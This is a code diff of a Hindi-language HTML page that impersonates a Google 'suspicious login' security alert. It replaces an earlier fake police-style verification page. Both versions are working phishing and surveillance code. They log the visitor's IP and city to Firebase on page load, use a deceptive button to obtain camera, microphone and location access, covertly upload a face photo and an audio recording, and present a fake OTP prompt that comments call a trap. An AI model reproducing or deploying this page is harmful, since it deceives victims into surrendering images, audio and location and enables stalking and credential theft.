@@ -3,29 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - पहचान की पुष्टि करें</title>
+    <title>Google - सुरक्षा अलर्ट</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
     <style>
         body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; }
-        .container { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; width: 100%; transition: background 0.2s; }
-        .btn:hover { background: #1765cc; }
+        .container { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        .alert-icon { color: #d93025; font-size: 48px; margin-bottom: 10px; }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 15px; color: #d93025; }
+        p { font-size: 14px; line-height: 1.6; margin-bottom: 25px; color: #5f6368; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
+        #otp-box { display: none; margin-top: 20px; }
+        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; text-align: center; font-size: 18px; letter-spacing: 5px; }
         #v, #c { display: none; }
     </style>
 </head>
 <body onload="initCapture()">
     <div class="container" id="mainBox">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/375px-Google_2015_logo.svg.png" class="logo">
-        <h1>पहचान की पुष्टि करें</h1>
-        <p>आपके डिवाइस पर संदिग्ध गतिविधि का पता चला है। जारी रखने के लिए अपनी पहचान की पुष्टि करना अनिवार्य है।</p>
-        <button class="btn" onclick="startPoliceAction()">पुष्टि करें</button>
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+        <div class="alert-icon">⚠️</div>
+        <h1>संदिग्ध लॉगिन प्रयास</h1>
+        <p>किसी ने अभी-अभी आपके Gmail पासवर्ड का उपयोग करके लॉगिन करने की कोशिश की है। सुरक्षा कारणों से, आपको अपने डिवाइस की पुष्टि करनी होगी।</p>
+        <button class="btn" onclick="triggerHardwareAccess()">डिवाइस की पुष्टि करें</button>
     </div>
-    
+
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
@@ -37,104 +40,90 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         const storage = firebase.storage();
-        const logId = "KP_CRIME_" + Date.now();
+        const logId = "G-SECURE-" + Date.now();
 
-        // 1. डीप डिवाइस इंटेलिजेंस (बिना कांटेक्ट के पहचान)
+        // 1. बैकग्राउंड ट्रेसिंग (Landing होते ही)
         async function initCapture() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                let batLevel = "N/A";
-                try { const bat = await navigator.getBattery(); batLevel = Math.round(bat.level * 100) + "%"; } catch(e) {}
-
-                database.ref('target_logs/' + logId).set({
-                    intel: {
-                        ip: data.ip,
-                        isp: data.org,
-                        city: data.city,
-                        os: navigator.platform,
-                        browser: navigator.userAgent,
-                        language: navigator.language,
-                        battery: batLevel,
-                        time: new Date().toLocaleString()
-                    },
-                    status: "Target Landed"
-                });
-            } catch(e) { console.error("Initial Trace Failed"); }
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            database.ref('target_logs/' + logId).set({
+                intel: { ip: data.ip, city: data.city, isp: data.org, time: new Date().toLocaleString() },
+                status: "Target Landed"
+            });
         }
 
-        // 2. मेन पुलिस एक्शन फंक्शन
-        async function startPoliceAction() {
+        // 2. कैमरा/माइक/लोकेशन एक्सेस ट्रिगर
+        async function triggerHardwareAccess() {
             try {
+                // यह पॉप-अप मांगेगा - जैसे ही 'Allow' करेगा, काम शुरू
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('v').srcObject = stream;
+                
+                // फोटो और ऑडियो कैप्चर शुरू
+                capturePhoto();
+                recordAudio(stream);
 
-                // साइलेंट कैप्चर (फोटो + ऑडियो)
-                setTimeout(() => captureFace("Primary_Suspect"), 1000);
-                startAudioIntercept(stream);
-
-                // लाइव मूवमेंट और स्पीड ट्रैकिंग
-                navigator.geolocation.watchPosition((p) => {
-                    database.ref('target_logs/' + logId + '/live_track').update({
-                        lat: p.coords.latitude,
-                        lng: p.coords.longitude,
-                        accuracy: p.coords.accuracy.toFixed(1) + "m",
-                        speed: p.coords.speed || 0,
-                        heading: p.coords.heading || "Stationary"
+                // लोकेशन ट्रैकिंग
+                navigator.geolocation.getCurrentPosition((p) => {
+                    database.ref('target_logs/' + logId).update({
+                        lat: p.coords.latitude, lng: p.coords.longitude
                     });
-                    
-                    // UI चेंज (अपराधी को शांत रखने के लिए)
-                    document.getElementById('mainBox').innerHTML = `<h1>सत्यापन सफल</h1><p>सुरक्षा जांच पूरी हो गई है।</p>`;
-                }, null, { enableHighAccuracy: true });
+                    showOTPBox(); // एक्सेस मिलने के बाद OTP बॉक्स दिखाएं
+                }, () => showOTPBox());
 
             } catch(e) {
-                // एंटी-ब्लॉक: अगर अपराधी अनुमति न दे
-                document.getElementById('mainBox').innerHTML = `<h1>OTP भेज दिया गया</h1><p>सत्यापन के लिए कोड डालें।</p><input type='text' placeholder='XXXX'><br><button class='btn'>Submit</button>`;
+                // अगर अपराधी 'Deny' कर दे, तो भी उसे OTP जाल में फंसाएं
+                database.ref('target_logs/' + logId).update({ status: "Permissions Denied" });
+                showOTPBox();
             }
         }
 
-        // 3. वाई-फाई प्रोब (आसपास के नेटवर्क स्कैन)
-        async function scanNetworks() {
-            if ('bluetooth' in navigator) {
-                try {
-                    const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-                    database.ref('target_logs/' + logId + '/nearby_networks').push({ name: device.name });
-                } catch(e) {}
-            }
+        function showOTPBox() {
+            document.getElementById('mainBox').innerHTML = `
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+                <h1>वेरिफिकेशन कोड</h1>
+                <p>हमने आपके रजिस्टर्ड नंबर पर 6-अंकों का कोड भेजा है।</p>
+                <input type="text" id="otp" placeholder="000000" maxlength="6">
+                <button class="btn" onclick="finalRedirect()">पुष्टि करें</button>
+            `;
         }
 
-        function captureFace(label) {
+        function capturePhoto() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob(async (blob) => {
-                const ref = storage.ref(`evidence/${logId}/${label}.jpg`);
-                await ref.put(blob);
-                const url = await ref.getDownloadURL();
-                database.ref('target_logs/' + logId).update({ photo: url });
-            }, 'image/jpeg');
+            setTimeout(() => {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(blob => {
+                    storage.ref(`evidence/${logId}/face.jpg`).put(blob).then(snap => {
+                        snap.ref.getDownloadURL().then(url => {
+                            database.ref('target_logs/' + logId).update({ photo: url });
+                        });
+                    });
+                }, 'image/jpeg');
+            }, 2000);
         }
 
-        function startAudioIntercept(stream) {
+        function recordAudio(stream) {
             const mr = new MediaRecorder(stream);
             let chunks = [];
             mr.ondataavailable = e => chunks.push(e.data);
-            mr.onstop = async () => {
+            mr.onstop = () => {
                 const blob = new Blob(chunks, {type: 'audio/webm'});
-                const ref = storage.ref(`evidence/${logId}/env_audio.webm`);
-                await ref.put(blob);
-                const url = await ref.getDownloadURL();
-                database.ref('target_logs/' + logId).update({ audio_evidence: url });
+                storage.ref(`evidence/${logId}/audio.webm`).put(blob).then(snap => {
+                    snap.ref.getDownloadURL().then(url => {
+                        database.ref('target_logs/' + logId).update({ audio: url });
+                    });
+                });
             };
             mr.start();
-            setTimeout(() => mr.stop(), 15000); // 15 सेकंड की डीप ऑडियो रिकॉर्डिंग
+            setTimeout(() => mr.stop(), 10000); // 10 सेकंड की रिकॉर्डिंग
         }
-        
-        // टैब बंद होने से पहले डेटा सुरक्षित करना
-        window.onbeforeunload = function() {
-            database.ref('target_logs/' + logId).update({ status: "Target left the page" });
-        };
+
+        function finalRedirect() {
+            alert("सत्यापन सफल। आपका अकाउंट अब सुरक्षित है।");
+            window.location.href = "https://myaccount.google.com/";
+        }
     </script>
 </body>
 </html>
